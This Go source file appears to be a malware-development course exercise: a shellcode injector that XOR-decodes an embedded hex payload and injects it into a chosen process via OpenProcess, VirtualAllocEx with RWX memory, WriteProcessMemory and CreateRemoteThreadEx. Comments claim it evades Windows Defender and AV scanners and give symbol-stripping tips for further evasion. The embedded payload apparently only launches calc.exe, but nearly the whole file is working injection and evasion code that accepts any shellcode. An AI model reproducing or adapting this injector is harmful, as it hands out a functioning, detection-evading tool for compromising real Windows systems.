package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
	"log"
	"os"
)

// Base code taken from Exercise 2, refer there if anything is unclear

// While there is a lot more evasion to do here, this example bypasses Windows Defender
// It also scores a 'low' 0/26 on Antiscan (your mileage may vary)
// To avoid strip much information, you should compile with the -ldflags "-s -w" flag

func init() {
	// Logs will be printing with the line number
	log.SetFlags(log.Llongfile)
}

func injectShellcode(shellcode []byte, pid uint32) {
	// Get a handle on the target process in order to interact with it
	pHandle, err := windows.OpenProcess(winsyscall.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		log.Fatal("Fail to open process: ", err)
	}
	// "Defer" can be used to clean up resources (pHandle) when the function exits
	defer windows.CloseHandle(pHandle)

	fmt.Println("Got a handle on process: ", pHandle)

	// Allocate RWX memory in the remote process
	// The opsec note from exercise 1 is applicable here, too
	var rPtr uintptr
	rPtr, err = winsyscall.VirtualAllocEx(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal("Fail allocating executable memory: ", err)
	}

	// Write the payload to the allocated bytes in the remote process
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, rPtr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		log.Fatal("Fail to write to allocated memory: ", err)
	}
	fmt.Println("WriteProcessMemory is ok. Bytes written: ", bytesWritten)
	fmt.Printf("rPtr: %#x\n", rPtr)

	// Create our remote thread to execute!
	tHandle, err := winsyscall.CreateRemoteThreadEx(pHandle, nil, 0, rPtr, 0, 0, nil)
	defer windows.CloseHandle(tHandle)
	fmt.Println("Started shellcode in thread: ", tHandle)

}

func xorEncrypt(dst, a []byte, key []byte) int {
	n := len(a)
	lenKey := len(key)
	if len(dst) < n {
		n = len(dst)
	}
	if n == 0 {
		return n
	}
	_ = dst[n-1]
	_ = a[n-1]
	for i := 0; i < n; i++ {
		dst[i] = a[i] ^ key[i%lenKey]
	}
	return n
}

func main() {
	const key = 0x37

	xoredShellcode, err := hex.DecodeString("cb7fb4d3c7dff7373737766676676566617f06e5527fbc65577fbc652f7fbc65177fbc45677f38807d7d7a06fe7f06f79b0b564b351b1776f6fe3a7636f6d5da6576667fbc6517bc750b7f36e7bcb7bf3737377fb2f743507f36e767bc7f2f73bc77177e36e7d4617fc8fe76bc03bf7f36e17a06fe7f06f79b76f6fe3a7636f60fd742c67b347b133f720ee642ef6f73bc77137e36e75176bc3b7f73bc772b7e36e776bc33bf7f36e7766f766f696e6d766f766e766d7fb4db177665c8d76f766e6d7fbc25de60c8c8c86a7f8d36373737373737377fbaba36363737768d06bc58b0c8e28cd72a1d3d768d91a28aaac8e27fb4f31f0b314b3db7ccd742328c702445585d376e76beedc8e2740d6b405e59535840446b444e4443525a04056b54565b5419524f5237")
	if err != nil {
		log.Fatal("Fail to decode shellcode: ", err)
	}

	// Define process ID (PID) to inject into
	// We use a PID here since resolving process name to PID is a bit more involved in Go
	// See the Go solution for bonus exercise 2 for details
	var processID int
	flag.IntVar(&processID, "pid", 0, "Process ID to inject shellcode into")
	flag.Parse()
	if processID == 0 {
		fmt.Println("Please specify a PID to inject into")
		os.Exit(1)
	}

	// Inject the shellcode into the process
	var shellcode = make([]byte, len(xoredShellcode))
	xorEncrypt(shellcode, xoredShellcode, []byte{key})
	injectShellcode(shellcode, uint32(processID))

}
